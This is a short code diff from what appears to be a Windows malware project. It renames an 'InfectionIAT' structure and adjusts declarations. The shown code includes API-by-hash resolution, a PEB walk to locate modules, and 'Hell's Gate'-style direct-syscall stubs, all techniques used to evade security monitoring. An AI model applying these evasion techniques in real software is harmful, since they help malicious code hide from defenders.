@@ -5,7 +5,7 @@
 
 extern void __fastcall limbo_hell(uintptr_t callback);
 extern void __fastcall limbos_gate(uint32_t syscall);
-extern uintptr_t __stdcall limbo_descent();
+extern limbo_descent();
 
 typedef struct __IATEntry
 {
@@ -92,7 +92,7 @@ BOOL get_proc_by_hash(const PIMAGE_DOS_HEADER module, IATEntry *entry)
    return FALSE;
 }
 
-BOOL load_iat(InfectionIAT *iat)
+BOOL load_iat(LimboIAT *iat)
 {
    PPEB peb = ((PPEB)__readfsdword(0x30));
    PLDR_DATA_TABLE_ENTRY list_entry = (PLDR_DATA_TABLE_ENTRY)peb->LoaderData->InLoadOrderModuleList.Flink;
